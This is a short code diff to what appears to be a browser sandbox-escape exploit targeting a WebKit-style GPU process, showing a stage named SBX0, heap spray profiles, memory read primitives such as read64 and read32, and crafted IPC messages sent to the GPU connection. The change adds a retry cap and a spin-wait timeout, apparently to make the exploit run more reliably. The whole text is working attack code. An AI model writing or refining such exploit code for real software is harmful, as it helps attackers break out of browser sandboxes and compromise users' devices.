@@ -7106,6 +7106,10 @@
     spray_profiles.wide
   ];
   (function SBX0() {
+    if (retry_count >= 4) {
+      LOG(`[!] SBX0 max retries (${retry_count}) reached, aborting`);
+      return false;
+    }
     LOG(`[+] SBX0() (retry: ${retry_count++})`);
     function GPUConnectionToWebProcess_CreateRenderingBackend(backendConnection) {
       gpuConnection.sendMessage(new Encoder(MessageName.GPUConnectionToWebProcess_CreateRenderingBackend, 0n).encode('uint64_t', backendConnection.identifier).encode('uint64_t', backendConnection.buffer.size), [backendConnection.receivePort, backendConnection.buffer.port]);
@@ -7537,8 +7541,14 @@
       const connection = read64(gpuProcessConnection + 0x20n);
       LOG(`waiting for sendPort`);
       read64_biguint64arr[1] = connection + 0x138n;
-      while (!read64_str.charCodeAt(0));
-      LOG(`received sendPort`);
+      let _spWait = 0;
+      while (!read64_str.charCodeAt(0)) {
+        if (++_spWait > 50000000) {
+          LOG(`sendPort timeout after ${_spWait} spins, bailing`);
+          return false;
+        }
+      }
+      LOG(`received sendPort (${_spWait} spins)`);
       const maybe_port = read32(connection + 0x138n);
       LOG(`maybe_port: ${maybe_port.hex()}`);
       gpuConnection = new Connection(connection, true, "respawned gpu connection");
